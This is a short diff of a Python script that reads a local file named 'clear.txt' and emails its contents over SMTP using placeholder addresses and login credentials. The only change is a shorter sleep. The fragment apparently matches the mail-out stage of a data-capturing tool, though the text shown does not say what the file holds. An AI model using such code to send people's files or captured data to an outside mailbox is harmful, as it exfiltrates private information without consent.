@@ -25,6 +25,6 @@ reciever = "RECIEVER MAIL ADDRESS HERE" #CHANGE THIS
 mess = open("clear.txt", "rb")
 message = mess.read()
 with smtplib.SMTP(host = "mail.yourdomain.com", port = 587) as server: #If you prefer to use gmail, you have to change settings for less secure applications...
-    time.sleep(2)
+    time.sleep(1)
     server.login("SENDER MAIL ADDRESS", "SENDER MAIL PASSWORD") #CHANGE THIS
     server.sendmail(sender, reciever, message)
